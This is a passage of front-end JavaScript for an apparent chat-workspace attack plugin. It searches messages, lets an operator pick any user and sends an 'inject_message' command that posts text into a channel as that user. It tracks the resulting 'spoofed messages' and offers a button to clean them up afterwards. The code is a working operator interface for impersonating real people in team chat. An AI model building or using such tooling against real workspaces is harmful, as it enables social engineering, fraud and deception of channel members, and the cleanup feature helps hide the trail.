            clearInterval(_searchPollTimer);
            _searchPollTimer = null;
            if (searchStatusEl) searchStatusEl.textContent = 'Timed out \u2014 try again';
            return;
        }
        pluginUI.fetchData('search_results', 10, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.query === searchQuery) {
                    searchResults = d;
                    renderSearchResults();
                    if (d.error) {
                        if (searchStatusEl) searchStatusEl.textContent = 'Error: ' + d.error;
                    } else {
                        if (searchStatusEl) searchStatusEl.textContent = '';
                    }
                    clearInterval(_searchPollTimer);
                    _searchPollTimer = null;
                    break;
                }
            }
        });
    }, 1000);
}

if (searchBtn) {
    searchBtn.onclick = function() {
        doSearch(searchInput ? searchInput.value : '');
    };
}

if (searchInput) {
    searchInput.onkeydown = function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            doSearch(searchInput.value);
        }
    };
}

if (searchCloseBtn) {
    searchCloseBtn.onclick = function() {
        var panel = pluginUI.container.querySelector('#mm-search-panel');
        if (panel) panel.style.display = 'none';
        searchResults = null;
        if (searchStatusEl) searchStatusEl.textContent = '';
    };
}

// ===== Inject controls =====

function updateInjectControls() {
    var textInput = pluginUI.container.querySelector('#mm-inject-text');
    var injectBtn = pluginUI.container.querySelector('#mm-inject-btn');
    var enabled = !!(selectedInjectUser && currentChannelId);
    if (textInput) textInput.disabled = !enabled;
    if (injectBtn) injectBtn.disabled = !enabled;
}

function renderInjectUserDropdown(filter) {
    var dropdown = pluginUI.container.querySelector('#mm-inject-user-dropdown');
    if (!dropdown) return;

    if (!filter || filter.length < 1) {
        dropdown.style.display = 'none';
        return;
    }

    var lf = filter.toLowerCase();
    var matches = [];
    for (var i = 0; i < users.length; i++) {
        var u = users[i];
        if (u.deleted) continue;
        var nameMatch = (u.name || '').toLowerCase().indexOf(lf) !== -1;
        var realMatch = (u.realName || '').toLowerCase().indexOf(lf) !== -1;
        var idMatch = (u.id || '').toLowerCase().indexOf(lf) !== -1;
        if (nameMatch || realMatch || idMatch) {
            matches.push(u);
            if (matches.length >= 15) break;
        }
    }

    if (matches.length === 0) {
        dropdown.style.display = 'none';
        return;
    }

    var html = '';
    for (var m = 0; m < matches.length; m++) {
        var u = matches[m];
        html += '<div class="mm-inject-user-item d-flex align-items-center" data-idx="' + m + '" ' +
            'style="padding:4px 8px;cursor:pointer;border-bottom:1px solid #52565a;color:#aaa" ' +
            'onmouseover="this.style.background=\'#52565a\'" onmouseout="this.style.background=\'\'">';
        html += userInitialAvatar(u.name || u.realName || '', u.id || '');
        html += '<span style="color:#fff">' + esc(u.name || '') + '</span>';
        if (u.realName) {
            html += '<span class="text-muted ms-2 small">' + esc(u.realName) + '</span>';
        }
        html += '</div>';
    }

    dropdown.innerHTML = html;
    dropdown.style.display = '';

    var items = dropdown.querySelectorAll('.mm-inject-user-item');
    for (var c = 0; c < items.length; c++) {
        (function(item, idx) {
            item.onmousedown = function(e) {
                e.preventDefault();
                var u = matches[idx];
                selectedInjectUser = { id: u.id, name: u.name, realName: u.realName };
                var labelEl = pluginUI.container.querySelector('#mm-inject-selected-user');
                if (labelEl) labelEl.innerHTML = '<span style="color:#fff">' + esc(u.name) + '</span> <span class="text-muted">(' + esc(u.realName || u.id) + ')</span>';
                var searchInput = pluginUI.container.querySelector('#mm-inject-user-search');
                if (searchInput) searchInput.value = u.name;
                dropdown.style.display = 'none';
                updateInjectControls();
            };
        })(items[c], c);
    }
}

var injectUserSearch = pluginUI.container.querySelector('#mm-inject-user-search');
if (injectUserSearch) {
    injectUserSearch.oninput = function() {
        renderInjectUserDropdown(injectUserSearch.value);
    };
    injectUserSearch.onblur = function() {
        setTimeout(function() {
            var dropdown = pluginUI.container.querySelector('#mm-inject-user-dropdown');
            if (dropdown) dropdown.style.display = 'none';
        }, 200);
    };
}

// Inject button
var injectBtn = pluginUI.container.querySelector('#mm-inject-btn');
var injectTextInput = pluginUI.container.querySelector('#mm-inject-text');
if (injectBtn) {
    injectBtn.onclick = function() {
        if (!selectedInjectUser || !currentChannelId || !injectTextInput || !injectTextInput.value.trim()) return;
        var statusEl = pluginUI.container.querySelector('#mm-inject-status');
        if (statusEl) { statusEl.style.display = ''; statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Injecting...</span>'; }

        sendCommand({
            action: 'inject_message',
            channelId: currentChannelId,
            senderId: selectedInjectUser.id,
            text: injectTextInput.value.trim(),
            senderName: selectedInjectUser.realName || selectedInjectUser.name
        });

        var polls = 0;
        if (_injectPollTimer) clearInterval(_injectPollTimer);
        _injectPollTimer = setInterval(function() {
            polls++;
            if (polls > 30) {
                clearInterval(_injectPollTimer);
                _injectPollTimer = null;
                if (statusEl) statusEl.innerHTML = '<span class="text-muted">Timed out waiting for result</span>';
                return;
            }
            pluginUI.fetchData('inject_result', 5, 0).then(function(result) {
                var rows = result.rows || [];
                if (rows.length > 0) {
                    var d = rows[0].data || {};
                    clearInterval(_injectPollTimer);
                    _injectPollTimer = null;
                    if (statusEl) {
                        if (d.success) {
                            statusEl.innerHTML = '<span class="text-muted">Injected via ' + esc(d.strategy || '?') + '</span>';
                        } else {
                            statusEl.innerHTML = '<span class="text-muted">Failed: ' + esc(d.error || 'unknown') + '</span>';
                        }
                    }
                }
            });
        }, 1000);
    };
}

if (injectTextInput) {
    injectTextInput.onkeydown = function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            if (injectBtn) injectBtn.click();
        }
    };
}

// ===== Injected message cleanup =====

function updateClearInjectedButton() {
    var btn = pluginUI.container.querySelector('#mm-clear-injected-btn');
    var badge = pluginUI.container.querySelector('#mm-injected-count');
    if (!btn) return;
    if (injectedMessageCount > 0) {
        btn.style.display = '';
        if (badge) badge.textContent = injectedMessageCount;
    } else {
        btn.style.display = 'none';
    }
}

var clearInjectedBtn = pluginUI.container.querySelector('#mm-clear-injected-btn');
if (clearInjectedBtn) {
    clearInjectedBtn.onclick = function() {
        if (injectedMessageCount === 0) return;
        var statusEl = pluginUI.container.querySelector('#mm-inject-status');
        if (statusEl) { statusEl.style.display = ''; statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Cleaning up spoofed messages...</span>'; }

        sendCommand({ action: 'clear_injected' });

        var polls = 0;
        if (_clearInjectedPollTimer) clearInterval(_clearInjectedPollTimer);
        var _preClearCount = injectedMessageCount;
        _clearInjectedPollTimer = setInterval(function() {
            polls++;
            if (polls > 30) {
                clearInterval(_clearInjectedPollTimer);
                _clearInjectedPollTimer = null;
                if (injectedMessageCount === 0 && _preClearCount > 0) {
                    updateClearInjectedButton();
                    if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + _preClearCount + ' spoofed message(s)</span>';
                } else {
                    if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleanup timed out</span>';
                }
                return;
            }
            loadData();
            if (injectedMessageCount === 0 && _preClearCount > 0) {
                clearInterval(_clearInjectedPollTimer);
                _clearInjectedPollTimer = null;
                updateClearInjectedButton();
                if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + _preClearCount + ' spoofed message(s)</span>';
                return;
            }
            pluginUI.fetchData('clear_injected_result', 5, 0).then(function(result) {
                var rows = result.rows || [];
                if (rows.length > 0) {
                    var d = rows[0].data || {};
                    clearInterval(_clearInjectedPollTimer);
                    _clearInjectedPollTimer = null;
                    if (d.success) {
                        injectedMessageCount = 0;
                        updateClearInjectedButton();
                        if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleared ' + (d.cleared || 0) + ' spoofed message(s)</span>';
                    } else {
                        if (statusEl) statusEl.innerHTML = '<span class="text-muted">Cleanup failed: ' + esc(d.error || 'unknown') + '</span>';
                    }
                }
            });
        }, 1000);
    };
}

// Initial load + auto-refresh
loadData();
_refreshTimer = setInterval(loadData, 3000);
